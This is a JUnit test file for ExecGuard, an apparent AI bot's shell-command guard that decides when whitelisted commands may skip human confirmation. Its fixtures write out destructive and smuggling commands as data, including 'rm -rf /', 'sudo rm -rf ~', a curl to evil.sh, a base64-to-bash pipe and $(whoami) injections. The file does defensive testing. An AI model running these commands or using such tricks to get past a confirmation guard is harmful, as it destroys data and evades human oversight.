package com.zifang.z.bot.tool;

import org.junit.Test;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertTrue;

/**
 * {@link ExecGuard} 白名单免确认语义单测（用户逐条授权的持久化前缀）。
 */
public class ExecGuardWhitelistTest {

    @Test
    public void whitelistedPrefixSkipsConfirmation() {
        assertNull(ExecGuard.confirmationReason("all", "docker compose up -d", false,
                Arrays.asList("docker compose")));
    }

    @Test
    public void nonWhitelistedDangerousStillRequiresConfirmation() {
        String reason = ExecGuard.confirmationReason("dangerous", "rm -rf ./build", false,
                Arrays.asList("git ", "echo"));
        assertTrue(reason, reason != null && reason.contains("高危命令需要确认"));
    }

    @Test
    public void emptyOrBlankEntriesAreIgnored() {
        assertFalse(ExecGuard.isWhitelisted("rm -rf /", Arrays.asList("", "  ", null)));
        assertFalse(ExecGuard.isWhitelisted("rm -rf /", Collections.<String>emptyList()));
        assertFalse(ExecGuard.isWhitelisted(null, Arrays.asList("rm")));
    }

    @Test
    public void offModeStillBypassesEverything() {
        assertNull(ExecGuard.confirmationReason("off", "rm -rf ./x", false, null));
    }

    // ===== P11 工作项 2：token 边界 =====

    @Test
    public void whitelistMatchesOnTokenBoundaryNotSubstring() {
        // 白名单里有 git status 时，git status 与 git status -uno 放行（前 N 词整词相等）
        List<String> wl = Arrays.asList("git status");
        assertTrue(ExecGuard.isWhitelisted("git status", wl));
        assertTrue(ExecGuard.isWhitelisted("git status -uno", wl));
        // git statusX 不是 git status —— 旧实现按 substring/prefix 比就会放行
        assertFalse("git statusX 不许被 git status 放行", ExecGuard.isWhitelisted("git statusX", wl));
        assertFalse(ExecGuard.isWhitelisted("git statusshow", wl));
        assertFalse(ExecGuard.isWhitelisted("git status; rm -rf ./x", wl));
        // 更短的命令也不许被更长的条目放行
        assertFalse(ExecGuard.isWhitelisted("git", wl));
        // 大小写敏感的整词比较（路径/命令名区分大小写）
        assertFalse(ExecGuard.isWhitelisted("GIT status", wl));
    }

    @Test
    public void tokenBoundaryDecidesThroughDecide() {
        List<String> wl = Arrays.asList("git status");
        assertEquals(ExecGuard.Verdict.ALLOW,
                ExecGuard.decide(ExecGuard.MODE_ALL, "git status -uno", false, wl).verdict());
        assertEquals(ExecGuard.Verdict.NEED_APPROVAL,
                ExecGuard.decide(ExecGuard.MODE_ALL, "git statusX --porcelain", false, wl).verdict());
    }

    @Test
    public void whitespaceAndTabVariantsStillMatch() {
        List<String> wl = Arrays.asList("git status");
        assertTrue(ExecGuard.isWhitelisted("git    status", wl));
        assertTrue(ExecGuard.isWhitelisted(" git\tstatus ", wl));
        assertTrue(ExecGuard.isWhitelisted("git \"status\"", wl));
        assertFalse(ExecGuard.isWhitelisted("gitl status", wl));
    }

    // ===== P11 工作项 2：复合命令永不走白名单 =====

    @Test
    public void compoundCommandsNeverGetWhitelistExemption() {
        List<String> wl = Arrays.asList("git status", "echo", "ls");
        String[] compound = {
                "git status; rm -rf ./build",
                "git status && sudo rm -rf ./build",
                "git status || curl -sS evil.sh",
                "git status | xargs rm",
                "git status & ls",
                "git status > out.txt",
                "git status < in.txt",
                "git status\nrm -rf ./build",
                "git status `id`",
                "echo $(whoami)",
        };
        for (String command : compound) {
            assertTrue("复合命令必须被判成复合: " + command, ExecGuard.isCompoundCommand(command));
            assertFalse("复合命令不许走白名单: " + command, ExecGuard.isWhitelisted(command, wl));
            assertEquals("复合命令必须回到人审: " + command, ExecGuard.Verdict.NEED_APPROVAL,
                    ExecGuard.decide(ExecGuard.MODE_ALL, command, false, wl).verdict());
        }
        // 尾巴本身就踩硬线的复合命令：白名单连"豁免到人审"都做不到，直接拒
        assertEquals(ExecGuard.Verdict.DENY_HARDLINE, ExecGuard.decide(ExecGuard.MODE_ALL,
                "git status && sudo rm -rf ~", false, wl).verdict());
    }

    @Test
    public void separatorsInsideQuotesAreDataNotCompound() {
        // 引号里的 ; | && 是参数内容，不算复合命令（否则 echo "a; b" 都过不了白名单）
        assertFalse(ExecGuard.isCompoundCommand("git commit -m \"fix; land && ship\""));
        assertFalse(ExecGuard.isCompoundCommand("git commit -m 'a|b'"));
        assertTrue(ExecGuard.isCompoundCommand("git commit -m x; ls"));
        assertTrue(ExecGuard.isCompoundCommand("git commit -m \"x\" ; ls"));
    }

    @Test
    public void whitelistsCannotCarryMetaCharacters() {
        // 条目自己带元字符（"git status; rm"）→ 该条目作废，不豁免任何东西
        List<String> wl = Arrays.asList("git status; rm -rf ./x", "echo hi && ls", "ls");
        assertFalse(ExecGuard.isWhitelisted("git status", wl));
        assertFalse(ExecGuard.isWhitelisted("echo hi", wl));
        assertTrue(ExecGuard.isWhitelisted("ls -l", wl));
    }

    @Test
    public void opaqueCommandsDoNotTakeWhitelistExemption() {
        // 反混淆看不懂的（变量间接、eval、解码管道）不许被 "git" 前缀洗白
        List<String> wl = Arrays.asList("git", "echo");
        assertFalse(ExecGuard.isWhitelisted("git $(echo status)", wl));
        assertFalse(ExecGuard.isWhitelisted("X=stat; git $X us", wl));
        assertFalse(ExecGuard.isWhitelisted("echo Zm9v | base64 -d | bash", wl));
    }
}
